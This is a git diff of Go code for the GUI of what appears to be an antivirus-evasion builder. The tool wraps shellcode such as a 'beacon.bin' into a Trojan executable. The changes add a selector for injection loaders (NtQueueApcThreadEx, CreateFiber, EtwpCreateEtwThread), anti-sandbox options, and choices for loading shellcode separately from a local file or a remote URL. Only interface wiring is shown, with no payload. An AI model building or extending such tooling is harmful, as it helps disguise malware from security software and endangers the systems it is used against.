@@ -36,8 +36,8 @@ var (
 		DstFile:           "result.exe",
 		ShellcodeEncode:   "",
 		Donut:             false,
-		Separate:          false,
-		ShellcodeLocation: "",
+		Separate:          "",
+		ShellcodeLocation: "code.txt",
 		AntiSandboxOpt:    AntiSandboxOpt,
 		BuildOpt:          BuildOpt,
 	}
@@ -45,6 +45,19 @@ var (
 
 func BypassAV(win fyne.Window) fyne.CanvasObject {
 	var fileSrcName string
+	//反射读取laoder
+	keys := reflect.ValueOf(core.Modules).MapKeys()
+	loaderTmp := make([]string, 0)
+	for _, lt := range keys {
+		loaderTmp = append(loaderTmp, lt.String())
+	}
+
+	//loader
+	selectLoaderEntry := widget.NewSelect(loaderTmp, func(s string) {
+		TempOpt.Module = s
+	})
+	selectLoaderEntry.PlaceHolder = "Loader type"
+
 	BypassFileEntry := widget.NewEntry()
 	BypassFileEntry.SetText("beacon.bin")
 	BypassFileButton := widget.NewButton("File", func() {
@@ -67,8 +80,8 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 			}
 			if ext == ".exe" || ext == ".dll" {
 				TempOpt.Donut = true
+				selectLoaderEntry.Options = []string{"NtQueueApcThreadEx", "CreateFiber", "EtwpCreateEtwThread", "HeapAlloc"}
 			}
-			TempOpt.SrcFile = fileSrcName
 			BypassFileEntry.SetText(fileSrcName)
 			println(TempOpt.Donut)
 		}, win)
@@ -90,12 +103,6 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 	SelectFileV := container.NewBorder(nil, nil, BypassFileButton, nil, BypassFileEntry)
 	TrojanFileV := container.NewBorder(nil, nil, middle, nil, TrojanNameEntry)
 
-	keys := reflect.ValueOf(core.Modules).MapKeys()
-	loaderTmp := make([]string, 0)
-	for _, lt := range keys {
-		loaderTmp = append(loaderTmp, lt.String())
-	}
-
 	BypassMixEntry := widget.NewEntry()
 	BypassMixEntry.SetPlaceHolder("Key")
 
@@ -103,10 +110,8 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 		TempOpt.ShellcodeEncode = s
 	})
 	shellcodeProcess.PlaceHolder = "Shellcode way"
-	selectLoaderEntry := widget.NewSelect(loaderTmp, func(s string) {
-		TempOpt.Module = s
-	})
-	selectLoaderEntry.PlaceHolder = "Loader type"
+
+	//sandbox
 	sandboxType := make([]string, 0)
 	sandboxList := reflect.TypeOf(AntiSandboxOpt)
 	sandboxListNum := sandboxList.NumField()
@@ -202,18 +207,33 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 
 	separateLocation.Hide()
 	separateUrl.Hide()
-
-	separateCheck := widget.NewCheck("分离免杀", func(b bool) {
-		TempOpt.Separate = b
-		switch b {
-		case true:
+	separateradio := widget.NewRadioGroup([]string{"本地文件分离免杀", "远程文件分离免杀"}, func(s string) {
+		//println(s)
+		TempOpt.Separate = s
+		switch s {
+		case "本地文件分离免杀":
 			separateLocation.Show()
-			separateUrl.Show()
-		case false:
+			separateUrl.Hide()
+		case "远程文件分离免杀":
 			separateLocation.Hide()
 			separateUrl.Show()
+		case "":
+			separateLocation.Hide()
+			separateUrl.Hide()
 		}
 	})
+	separateradio.Horizontal = true
+	//separateCheck := widget.NewCheck("分离免杀", func(b bool) {
+	//	TempOpt.Separate = b
+	//	switch b {
+	//	case true:
+	//		separateLocation.Show()
+	//		separateUrl.Show()
+	//	case false:
+	//		separateLocation.Hide()
+	//		separateUrl.Show()
+	//	}
+	//})
 	//增强功能UI设计
 	//advancedchecklabel := widget.NewLabel("增 强 功 能 ：")
 	//advancedcheck1 := widget.NewCheck("末尾添加垃圾数据过WD", func(b bool) {
@@ -234,6 +254,7 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 			return
 		}
 		infProgress.Start()
+		TempOpt.SrcFile = BypassFileEntry.Text
 		TempOpt.DstFile = TrojanNameEntry.Text
 		TempOpt.ShellcodeLocation = separateLocationText.Text
 		TempOpt.ShellcodeUrl = separateUrlText.Text
@@ -244,7 +265,7 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 	return container.NewVBox(
 		SelectFileV,
 		TrojanFileV,
-		separateCheck,
+		separateradio,
 		separateLocation,
 		separateUrl,
 		BypassSelectV,
